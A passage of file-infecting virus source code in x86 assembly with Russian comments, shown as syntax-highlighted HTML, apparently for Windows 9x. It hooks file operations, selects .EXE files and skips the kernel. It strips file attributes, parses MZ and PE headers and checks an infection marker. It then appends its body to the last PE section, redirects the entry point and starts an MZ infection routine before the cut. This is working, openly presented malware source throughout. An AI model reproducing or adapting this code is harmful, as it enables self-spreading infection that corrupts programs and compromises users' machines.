        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">254</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00400041h</span><span class="sc0">       </span><span class="sc1">; UniToBCSPath</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">VxDcall</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Exit3</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc1">;[Проверяем расширение файла]</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'EXE.'</span><span class="sc0">
</span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc12">'XXX.'</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Exit3</span><span class="sc0">


</span><span class="sc1">;[Если это KRNL386.EXE, то выходим]</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">9</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'LNRK'</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Exit3</span><span class="sc0">


</span><span class="sc1">;[Получаем атрибуты файла]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4300h</span><span class="sc0">       </span><span class="sc1">; R0_GetFileAttributes</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FileIO</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">Exit3</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">


</span><span class="sc1">;[Обнуляем атрибуты файла]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4301h</span><span class="sc0">       </span><span class="sc1">; R0_SetFileAttributes</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FileIO</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">RestAttr</span><span class="sc0">


</span><span class="sc1">;[Открываем файл]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D500h</span><span class="sc0">     </span><span class="sc1">; R0_OpenCreateFile</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2022h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FileIO</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">RestAttr</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">


</span><span class="sc1">;[Считываем MZ заголовок]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DosHeaderSize</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DosHeader</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Read</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">Close</span><span class="sc0">


</span><span class="sc1">;[Проверяем тип файла и его зараженность]</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DosHeader</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc2">00h</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc12">'ZM'</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Close</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DosHeader</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">6666h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Close</span><span class="sc0">


</span><span class="sc1">;[Считываем четыре байта по смещению 3Ch от начала файла]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Ch</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WinHeaderOfs</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Read</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">Close</span><span class="sc0">


</span><span class="sc1">;[Считываем PE заголовок]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">WinHeaderSize</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WinHeaderOfs</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WinHeader</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Read</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">Close</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">InfectMZ</span><span class="sc0">


</span><span class="sc1">;[Проверяем тип файла]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WinHeader</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'EP'</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">InfectPE</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'EN'</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">InfectNE</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'EL'</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Close</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'XL'</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">InfectMZ</span><span class="sc0">


</span><span class="sc1">;[Закрываем файл]</span><span class="sc0">

</span><span class="sc5">Close</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D700h</span><span class="sc0">         </span><span class="sc1">; R0_CloseFile</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FileIO</span><span class="sc0">


</span><span class="sc1">;[Восстанавливаем атрибуты файла]</span><span class="sc0">

</span><span class="sc5">RestAttr</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4301h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FileIO</span><span class="sc0">


</span><span class="sc1">;[Сбрасываем флажок занятости и передаем управление дальше]</span><span class="sc0">

</span><span class="sc5">Exit3</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Busy</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">Exit2</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc5">Exit1</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">25FFh</span><span class="sc0">
</span><span class="sc5">PrevHook</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">





















</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">
</span><span class="sc1">;                           ЗАРАЖЕНИЕ ФАЙЛОВ</span><span class="sc0">
</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc1">;[Проверяем, заражен ли файл]</span><span class="sc0">

</span><span class="sc5">InfectPE</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WinHeader</span><span class="sc4">+</span><span class="sc2">58h</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'6666'</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Close</span><span class="sc0">


</span><span class="sc1">;[Вычисляем смещение последнего элемента в таблице объектов]</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WinHeader</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">PEObjectSize</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WinHeader</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc4">-</span><span class="sc5">PEObjectSize</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WinHeaderOfs</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WinObjectOfs</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">


</span><span class="sc1">;[Считываем последний элемент таблицы объектов]</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">PEObjectSize</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WinObject</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Read</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">Close</span><span class="sc0">


</span><span class="sc1">;[Сравниваем физический и виртуальный размеры объекта]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WinObject</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WinObject</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">Skip</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WinObject</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">


</span><span class="sc1">;[Сохраняем старую и вычисляем новую точку входа]</span><span class="sc0">

</span><span class="sc5">Skip</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WinObject</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">StartPE</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">)+(</span><span class="sc5">EndCode16</span><span class="sc4">-</span><span class="sc5">Start16</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WinHeader</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">RetAddress</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">)-</span><span class="sc5">StartPE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RetAddress</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WinHeader</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">


</span><span class="sc1">;[Корректируем размер файла]</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">EndCode32</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WinHeader</span><span class="sc4">+</span><span class="sc2">50h</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">


</span><span class="sc1">;[Вычисляем смещение, по которому нужно записать вирус]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WinObject</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WinObject</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">


</span><span class="sc1">;[Корректируем виртуальный и физический размеры последнего объекта]</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WinObject</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">CodeSize</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WinObject</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">CodeSize</span><span class="sc0">


</span><span class="sc1">;[Устанавливаем признак зараженности]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WinHeader</span><span class="sc4">+</span><span class="sc2">58h</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'6666'</span><span class="sc0">


</span><span class="sc1">;[Записываем код вируса в файл]</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteVirus1</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">Close</span><span class="sc0">


</span><span class="sc1">;[Записываем новый PE заголовок]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">PEHeaderSize</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WinHeaderOfs</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WinHeader</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Write</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">Close</span><span class="sc0">


</span><span class="sc1">;[Записываем новый последний элемент таблицы объектов]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">PEObjectSize</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WinObjectOfs</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WinObject</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Write</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Close</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc1">;[Проверяем, содержит ли файл оверлеи]</span><span class="sc0">

</span><span class="sc5">InfectMZ</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFSize</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">Close</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Calc</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DosHeader</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Close</span><span class="sc0">


</span><span class="sc1">;[Вычисляем длину файла с вирусом]</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFSize</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">Close</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc5">CodeSize</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Calc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DosHeader</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">


</span><span class="sc1">;[Сохраняем SS, SP, CS и IP]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DosHeader</span><span class="sc4">+</span><span class="sc2">0Eh</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OldSS</span><span class="sc4">-</span><span class="sc5">EndCode16</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DosHeader</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OldSP</span><span class="sc4">-</span><span class="sc5">EndCode16</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DosHeader</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OldCSIP</span><span class="sc4">-</span><span class="sc5">EndCode16</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">


</span><span class="sc1">;[Вычисляем новую точку входа]</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFSize</span><span class="sc0">
